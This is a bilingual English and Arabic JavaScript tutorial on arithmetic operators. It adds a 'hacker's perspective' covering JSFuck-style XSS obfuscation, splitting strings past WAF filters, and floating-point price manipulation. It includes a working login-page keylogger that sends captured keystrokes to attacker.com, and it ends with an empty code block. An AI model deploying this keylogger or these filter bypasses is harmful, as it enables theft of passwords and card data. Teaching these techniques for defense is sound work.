2. Operators & Arithmetic in JavaScript

Basic Arithmetic Operators:
- Addition (+): Adds numbers or concatenates strings.
- Subtraction (-): Subtracts numbers.
- Multiplication (*): Multiplies numbers.
- Division (/): Divides numbers.
- Modulus / Remainder (%): Returns the division remainder.

Increment & Decrement:
- Increment (++): Adds 1 to the variable (e.g., x++).
- Decrement (--): Subtracts 1 from the variable (e.g., y--).

Compound Assignment Operators:
- x += 5  (Equivalent to: x = x + 5)
- x -= 5  (Equivalent to: x = x - 5)
- x *= 5  (Equivalent to: x = x * 5)
- x /= 5  (Equivalent to: x = x / 5)

Data Types Note:
- Decimals / Floats: Numbers with precision (e.g., const decimal = 5.2).

---

### (JS Core Concept)

العوامل الحسابية (**Arithmetic Operators**) هي العمليات الرياضية التي تُجرى على الأرقام والمتغيرات.

- **العمليات الأساسية:** الجمع `+`، الطرح `-`، الضرب `*`، القسمة `/`.
    
- **باقي القسمة (Modulus `%`):** بيرجع النتيجة المتبقية من القسمة (مثلاً `11 % 3` الناتج `2` لأن 11 فيها ثلاث ثلاثات وباقي 2).
    
- **المعاملات التراكمية (Increment / Decrement):**
    
    - `x++` بتزود قيمة المتغير 1.
        
    - `y--` بتبت نقص قيمة المتغير 1.
        
- **الدمج والإسناد (Compound Assignment):** اختصار لكتابة العمليات الحسابية المسندة لنفس المتغير، بدل ما تكتب `x = x + 5` بتكتبها `x += 5`.
    
- **سلوك خاص للعلامة `+`:** لو جمعت أرقام بتعمل عملية حسابية عادي (`5 + 6 = 11`)، لكن لو استخدمتها مع String بتتحول لعملية دمج نصوص (**Concatenation**) زي `"5" + 6 = "56"`.
    

### 3. 💻 مثال برمجي تقليدي (Standard Example)

JavaScript

```
// Arithmetic Operations
let num1 = 10;
let num2 = 3;

let sum = num1 + num2;        // 13
let remainder = num1 % num2;  // 1

// Increment & Compound Assignment
let score = 5;
score++;                      // score is now 6
score += 10;                  // score is now 16

console.log("Final Score:", score);
```

### 4. ⚔️ منظور الهكر (JS for Hackers)

العمليات الحسابية في الجافاسكريبت مش مجرد "رياضة"، دي واحدة من أقوى الأدوات في الـ Exploitation والـ Obfuscation لأسباب خطيرة:

1. **الـ JSFuck والتخفي الخارق بالمعاملات (Zero-Alphabet Payloads):**
    
    - الجافاسكريبت بتسمح بتحويل الأنواع (**Type Coercion**) بفضل المعاملات الحسابية مثل `+` و `!`.
        
    - المهاجم يقدر يكتب **Payload كامل بـ XSS** من غير استخدام أي حرف أو رقم! فقط باستخدام 6 رموز: `[ ] ( ) ! +`.
        
    - مثلاً: `+[]` بتعطي `0`، و `![]` بتعطي `false`، و `+![]` بتعطي `1`. بجمعهم بتصنع أي حرف وأي دالة لتجاوز الـ WAFs بالكامل!
        
2. **التجميع والتسريب الخفي للبيانات (Exfiltration Buffering):**
    
    - معامِل `+=` بيُستخدم لكتابة سارقي ضغطات المفاتيح (**Keyloggers**) وسارقي البيانات (**Credit Card Skimmers**) لتجميع الـ Input بتاع الضحية حرف بحرف قبل إرساله لسيرفر الهكر.
        
3. **مشاكل الدقة الأرقام وحسابات المبالغ (Precision Bugs & Integer Overflow):**
    
    - الأرقام الكسرية في JS بتتبع معيار `IEEE 754`؛ وده بيخلي `0.1 + 0.2` تطلع `0.30000000000000004` بدل `0.3`!
        
    - لو التطبيق بيحسب أسعار المنتجات أو الخصومات في الـ Client-Side بـ JS، المهاجم يقدر يستغل الخلل ده للتلاعب بقيم الشراء أو تجاوز الـ Balance Checks.
        
4. **تجاوز الفلاتر بكسر النصوص (String Concatenation Bypass):**
    
    - لو الـ WAF بيعمل Block لكلمة زي `document.cookie` أو `alert`، الهكر بيستخدم معامل `+` لتقسيم الكلمة وتجاوز الـ Signature Matching.
        

### 5. 🎯 أمثلة هجومية وسيناريوهات استغلال (PoC & Payloads)

#### 📌 السيناريو الأول: صنع كود هجومي بـ `+` و `!` فقط (JSFuck Magic)

إزاي الـ JS بتحول الرموز لأرقام ونصوص عبر المعامل `+`:

JavaScript

```
// إزاي تطلع أرقام من الرموز:
+[]          // الناتج: 0 (Number)
+![]         // الناتج: 1 (Number)
![]          // الناتج: false (Boolean)
![] + []     // الناتج: "false" (String)
+![] + +![]  // الناتج: 2 (Number)

// إزاي نجيب الحروف من الكلمات:
(![] + [])[1] // بياخد الحرف رقم 1 من كلمة "false" -> الناتج: "a"

// Payload XSS كامل لتشغيل alert(1) بدون حروف نهائياً:
// [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+...]
```

#### 📌 السيناريو الثاني: كتابة Keylogger لسلسلة ضغطات المفاتيح بـ `+=`

استغلال معامل `+=` لتجميع بيانات الكارت أو الباسورد وإرسالها لسيرفر هجومي:

JavaScript

```
// كود مكسور / محقون جوه صفحة Login
let capturedData = "";

document.addEventListener("keypress", function(event) {
    // تجميع الحروف المضغوطة باستمرار
    capturedData += event.key; 
    
    // إرسال البيانات المجمعة أول ما الضحية يضغط Enter (رمز 13)
    if (event.keyCode === 13) {
        new Image().src = "https://attacker.com/log?data=" + encodeURIComponent(capturedData);
        capturedData = ""; // إعادة ضبط
    }
});
```

لو الفلتر بيمسح كلمة `alert`:

JavaScript

```

// أو بدمج الـ Modulus والرقم للحصول على الكلمة:
```
